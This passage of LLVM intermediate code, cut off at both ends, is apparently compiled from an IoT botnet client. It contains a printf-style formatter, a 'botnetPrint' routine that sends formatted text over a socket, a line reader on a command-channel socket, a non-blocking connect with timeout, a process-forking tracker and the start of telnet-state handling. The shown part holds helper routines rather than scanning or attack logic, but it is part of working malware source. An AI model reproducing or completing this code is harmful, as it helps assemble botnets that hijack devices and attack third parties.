  br i1 %100, label %101, label %106

; <label>:101:                                    ; preds = %98
  %102 = load i8*, i8** %15, align 8
  %103 = sext i32 %99 to i64
  %104 = getelementptr i8, i8* %102, i64 %103
  %105 = add i32 %99, 8
  store i32 %105, i32* %14, align 8
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i8*, i8** %16, align 8
  %108 = getelementptr i8, i8* %107, i64 8
  store i8* %108, i8** %16, align 8
  br label %109

; <label>:109:                                    ; preds = %106, %101
  %.in66 = phi i8* [ %104, %101 ], [ %107, %106 ]
  %110 = bitcast i8* %.in66 to i32*
  %111 = load i32, i32* %110, align 4
  %112 = tail call fastcc i32 @printi(i8** %0, i32 %111, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %113 = add nsw i32 %112, %.061
  br label %151

; <label>:114:                                    ; preds = %.critedge
  %115 = load i32, i32* %17, align 8
  %116 = icmp ult i32 %115, 41
  br i1 %116, label %117, label %122

; <label>:117:                                    ; preds = %114
  %118 = load i8*, i8** %18, align 8
  %119 = sext i32 %115 to i64
  %120 = getelementptr i8, i8* %118, i64 %119
  %121 = add i32 %115, 8
  store i32 %121, i32* %17, align 8
  br label %125

; <label>:122:                                    ; preds = %114
  %123 = load i8*, i8** %19, align 8
  %124 = getelementptr i8, i8* %123, i64 8
  store i8* %124, i8** %19, align 8
  br label %125

; <label>:125:                                    ; preds = %122, %117
  %.in65 = phi i8* [ %120, %117 ], [ %123, %122 ]
  %126 = bitcast i8* %.in65 to i32*
  %127 = load i32, i32* %126, align 4
  %128 = tail call fastcc i32 @printi(i8** %0, i32 %127, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %129 = add nsw i32 %128, %.061
  br label %151

; <label>:130:                                    ; preds = %.critedge
  %131 = load i32, i32* %20, align 8
  %132 = icmp ult i32 %131, 41
  br i1 %132, label %133, label %138

; <label>:133:                                    ; preds = %130
  %134 = load i8*, i8** %21, align 8
  %135 = sext i32 %131 to i64
  %136 = getelementptr i8, i8* %134, i64 %135
  %137 = add i32 %131, 8
  store i32 %137, i32* %20, align 8
  br label %141

; <label>:138:                                    ; preds = %130
  %139 = load i8*, i8** %24, align 8
  %140 = getelementptr i8, i8* %139, i64 8
  store i8* %140, i8** %24, align 8
  br label %141

; <label>:141:                                    ; preds = %138, %133
  %.in = phi i8* [ %136, %133 ], [ %139, %138 ]
  %142 = bitcast i8* %.in to i32*
  %143 = load i32, i32* %142, align 4
  %144 = trunc i32 %143 to i8
  store i8 %144, i8* %22, align 1
  store i8 0, i8* %23, align 1
  %145 = call fastcc i32 @prints(i8** %0, i8* nonnull %22, i32 %.064.lcssa, i32 %.063.lcssa)
  %146 = add nsw i32 %145, %.061
  br label %151

; <label>:147:                                    ; preds = %27, %25
  %.3 = phi i8* [ %.0, %25 ], [ %28, %27 ]
  %148 = load i8, i8* %.3, align 1
  %149 = zext i8 %148 to i32
  tail call fastcc void @printchar(i8** %0, i32 %149)
  %150 = add nsw i32 %.061, 1
  br label %151

; <label>:151:                                    ; preds = %.critedge, %147, %141, %125, %109, %93, %77, %59
  %.162 = phi i32 [ %150, %147 ], [ %65, %59 ], [ %81, %77 ], [ %97, %93 ], [ %113, %109 ], [ %129, %125 ], [ %146, %141 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %147 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %77 ], [ %.2.lcssa, %93 ], [ %.2.lcssa, %109 ], [ %.2.lcssa, %125 ], [ %.2.lcssa, %141 ], [ %.2.lcssa, %.critedge ]
  %152 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:153:                                    ; preds = %27, %25
  %154 = icmp eq i8** %0, null
  br i1 %154, label %157, label %155

; <label>:155:                                    ; preds = %153
  %156 = load i8*, i8** %0, align 8
  store i8 0, i8* %156, align 1
  br label %157

; <label>:157:                                    ; preds = %153, %155
  %158 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %158)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #6
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #6
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #14
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #6
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #6
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #7

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #8

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  %4 = tail call i16** @__ctype_b_loc() #15
  %5 = load i16*, i16** %4, align 8
  br label %6

; <label>:6:                                      ; preds = %6, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %6 ], [ 0, %1 ]
  %7 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %8 = load i8, i8* %7, align 1
  %9 = sext i8 %8 to i64
  %10 = getelementptr inbounds i16, i16* %5, i64 %9
  %11 = load i16, i16* %10, align 2
  %12 = and i16 %11, 8192
  %13 = icmp eq i16 %12, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %13, label %.preheader, label %6

.preheader:                                       ; preds = %6
  %14 = trunc i64 %3 to i32
  %15 = trunc i64 %indvars.iv29 to i32
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %.critedge.preheader, label %.lr.ph22

.lr.ph22:                                         ; preds = %.preheader
  %17 = load i16*, i16** %4, align 8
  %sext = shl i64 %3, 32
  %18 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %19 = ashr exact i64 %sext31, 32
  br label %24

.critedge.preheader.loopexit:                     ; preds = %24, %33
  %.0.lcssa.ph = phi i32 [ %32, %24 ], [ %34, %33 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %14, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %20 = icmp sgt i32 %15, %.0.lcssa
  br i1 %20, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %21 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %22 = ashr exact i64 %sext33, 32
  %23 = sext i32 %.0.lcssa to i64
  br label %.critedge

; <label>:24:                                     ; preds = %33, %.lr.ph22
  %indvars.iv27 = phi i64 [ %indvars.iv.next28, %33 ], [ %18, %.lr.ph22 ]
  %.021 = phi i32 [ %34, %33 ], [ %14, %.lr.ph22 ]
  %25 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i64
  %28 = getelementptr inbounds i16, i16* %17, i64 %27
  %29 = load i16, i16* %28, align 2
  %30 = and i16 %29, 8192
  %31 = icmp eq i16 %30, 0
  %32 = trunc i64 %indvars.iv27 to i32
  br i1 %31, label %.critedge.preheader.loopexit, label %33

; <label>:33:                                     ; preds = %24
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %34 = add nsw i32 %.021, -1
  %35 = icmp sgt i64 %indvars.iv27, %19
  br i1 %35, label %24, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %21, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %36 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %37 = load i8, i8* %36, align 1
  %38 = sub nsw i64 %indvars.iv, %22
  %39 = getelementptr inbounds i8, i8* %0, i64 %38
  store i8 %37, i8* %39, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %40 = icmp slt i64 %indvars.iv, %23
  br i1 %40, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %41 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %41, 32
  %42 = ashr exact i64 %sext34, 32
  %43 = getelementptr inbounds i8, i8* %0, i64 %42
  store i8 0, i8* %43, align 1
  ret void
}

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #6
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #6, !srcloc !3
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %5) #6
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @switchCommStock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #6
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #5

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #6
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #6
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #6
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #6, !srcloc !4
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #6
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #6
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #6
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #6
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #6
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #6
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #6
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #6
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
